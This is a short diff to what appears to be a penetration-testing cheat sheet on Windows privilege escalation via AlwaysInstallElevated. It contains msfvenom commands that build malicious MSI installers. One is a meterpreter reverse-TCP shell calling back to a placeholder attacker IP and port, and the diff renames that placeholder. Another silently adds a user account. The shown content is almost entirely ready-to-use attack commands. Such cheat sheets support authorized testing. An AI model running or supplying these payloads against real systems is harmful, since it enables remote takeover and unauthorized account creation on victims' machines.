@@ -15,7 +15,7 @@ use exploit/windows/local/always_install_elevated
 
 ### Generate .msi file with Msfvenom
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=LOCAL_IP_ADDRESS LPORT=LOCAL_PORT –f msi > evil.msi
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=<ATTACKER-PORT> –f msi > evil.msi
 ```
 ```
 msfvenom -p windows/adduser USER=username PASS=password -f msi > adduser.msi # Add user
